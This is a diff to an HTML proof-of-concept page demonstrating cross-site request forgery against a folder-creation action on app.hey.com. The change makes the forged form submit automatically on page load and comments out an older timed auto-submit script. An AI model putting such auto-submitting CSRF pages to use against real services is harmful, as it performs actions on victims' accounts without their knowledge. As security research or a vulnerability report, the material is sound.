@@ -9,7 +9,7 @@
     .warning { color: #7a1f1f; background:#fff1f0; padding:0.5rem 1rem; border-radius:6px; margin-bottom:1rem; }
   </style>
 </head>
-<body>
+<body onload="document.forms[0].submit()">
   <h1>CSRF demonstration (Create folder on app.hey.com)</h1>
 
   <div class="warning" role="alert">
@@ -27,11 +27,12 @@
     <button type="submit">CSRF – Create Folder (manual)</button>
   </form>
 
-  <!-- Optional: auto-submit for demonstration. Keep commented unless you know what you're doing.-->
+  <!-- Optional: auto-submit for demonstration. Keep commented unless you know what you're doing.
   <script>
     // Auto-submit after 2 seconds for a demo (UNSAFE on production):
     setTimeout(() => document.getElementById('csrf-form').submit(), 2000);
   </script>
+  -->
   
 
   <hr>
